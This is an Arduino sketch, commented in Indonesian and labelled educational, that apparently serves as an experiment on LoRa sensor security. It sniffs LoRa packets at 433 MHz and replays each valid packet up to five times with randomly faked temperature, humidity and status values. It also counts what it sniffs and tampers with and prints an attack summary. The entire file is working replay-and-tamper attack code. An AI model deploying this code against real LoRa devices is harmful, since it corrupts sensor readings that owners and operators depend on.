/*
ATTACKER / SNIFFER + RANDOM REPLAY LoRa
--------------------------------
Author: Mohammad Rizki Fadillah

Description:
- Menyadap paket LoRa
- Replay otomatis setiap paket yang berhasil ditangkap
- Jumlah replay random (1-5x)
- Delay replay random
- Simulasi replay attack lebih realistis

FOR EDUCATIONAL PURPOSE ONLY
--------------------------------
*/

#include <SPI.h>
#include <LoRa.h>

#define SS   5
#define RST  14
#define DIO0 26

// =====================================
// PARAMETER
// =====================================
const uint32_t EXPECTED = 200;
const unsigned long TIMEOUT_MS = 30000;

// =====================================
// METRICS
// =====================================
uint32_t sniffedCount   = 0;
uint32_t decodedCount   = 0;
uint32_t invalidCount   = 0;
uint32_t replayedCount  = 0;
uint32_t tamperedCount  = 0;

// =====================================
bool seen[EXPECTED] = {false};
uint32_t uniqueCount = 0;
uint32_t duplicateCount = 0;

unsigned long lastRecvTime = 0;
bool started = false;
bool done = false;

// =====================================
// VALIDASI PAYLOAD
// =====================================
bool isValidPayload(String data, uint32_t &id) {

  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);

  if (p1 == -1 || p2 == -1) return false;

  String idStr = data.substring(0, p1);

  for (int i = 0; i < idStr.length(); i++) {
    if (!isDigit(idStr[i])) return false;
  }

  id = idStr.toInt();
  return true;
}

// =====================================
// RANDOM TAMPER FUNCTION
// =====================================
String tamperPayload(String data) {

  int p1 = data.indexOf(',');
  int p2 = data.indexOf(',', p1 + 1);

  String id  = data.substring(0, p1);
  String ts  = data.substring(p1 + 1, p2);

  // RANDOM VALUE EXTREME
  float fakeTemp = random(50, 500) / 10.0;   // 5.0 - 50.0 (liar)
  float fakeHum  = random(50, 1000) / 10.0;  // 5 - 100%

  // RANDOM STATUS (TIDAK SESUAI RULE)
  String status;
  int r = random(0, 3);

  if (r == 0) status = "PANAS";
  else if (r == 1) status = "NORMAL";
  else status = "DINGIN";

  return id + "," + ts + "," +
         String(fakeTemp, 2) + "," +
         String(fakeHum, 2) + "," +
         status;
}

// =====================================
// SUMMARY
// =====================================
void printSummary() {

  float sniffRate = (sniffedCount * 100.0) / EXPECTED;

  float decodeRate =
    (sniffedCount > 0)
    ? (decodedCount * 100.0 / sniffedCount)
    : 0;

  float packetLoss = 100.0 - sniffRate;

  Serial.println("\n========== ATTACK SUMMARY ==========");

  Serial.print("Sniffed Total     : "); Serial.println(sniffedCount);
  Serial.print("Decoded Valid     : "); Serial.println(decodedCount);
  Serial.print("Tampered Packets  : "); Serial.println(tamperedCount);
  Serial.print("Invalid Payload   : "); Serial.println(invalidCount);
  Serial.print("Unique Packet     : "); Serial.println(uniqueCount);
  Serial.print("Duplicate Packet  : "); Serial.println(duplicateCount);
  Serial.print("Replay Sent Total : "); Serial.println(replayedCount);

  Serial.print("Sniff Success (%) : "); Serial.println(sniffRate);
  Serial.print("Packet Loss (%)   : "); Serial.println(packetLoss);
  Serial.print("Decode Success(%) : "); Serial.println(decodeRate);

  Serial.println("====================================");
}

// =====================================
// SETUP (IMPORTANT FIX RECEIVER MODE)
// =====================================
void setup() {

  Serial.begin(115200);

  randomSeed(micros());

  SPI.begin(18, 19, 23, SS);
  LoRa.setPins(SS, RST, DIO0);

  if (!LoRa.begin(433E6)) {
    Serial.println("LoRa init FAILED!");
    while (1);
  }

  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);

  LoRa.receive(); // penting

  Serial.println("====================================");
  Serial.println("ATTACKER READY");
  Serial.println("MODE : RANDOM TAMPER + REPLAY");
  Serial.println("====================================");
}

// =====================================
// LOOP
// =====================================
void loop() {

  if (done) return;

  int packetSize = LoRa.parsePacket();

  if (packetSize) {

    started = true;
    lastRecvTime = millis();

    sniffedCount++;

    String data = "";

    while (LoRa.available()) {
      data += (char)LoRa.read();
    }

    uint32_t id = 0;
    bool valid = isValidPayload(data, id);

    if (valid) {

      decodedCount++;

      if (id < EXPECTED) {
        if (!seen[id]) {
          seen[id] = true;
          uniqueCount++;
        } else {
          duplicateCount++;
        }
      }
    } else {
      invalidCount++;
    }

    // =====================================
    // LOG SNIFF
    // =====================================
    Serial.print("[SNIFF] ");
    Serial.println(data);

    // =====================================
    // TAMPER + REPLAY
    // =====================================
    if (valid) {

      int replayTimes = random(1, 6);

      Serial.print("[ATTACK] Replay x");
      Serial.println(replayTimes);

      for (int i = 0; i < replayTimes; i++) {

        delay(random(200, 800));

        String tampered = tamperPayload(data);
        tamperedCount++;
        replayedCount++;

        Serial.print("[TAMPER] ");
        Serial.println(tampered);

        LoRa.beginPacket();
        LoRa.print(tampered);
        LoRa.endPacket();

        LoRa.receive(); // IMPORTANT FIX (biar ga “mati nangkep”)
      }
    }

    if (sniffedCount >= EXPECTED) {
      printSummary();
      done = true;
    }
  }

  // =====================================
  // TIMEOUT
  // =====================================
  if (started && !done && (millis() - lastRecvTime > TIMEOUT_MS)) {
    printSummary();
    done = true;
  }
}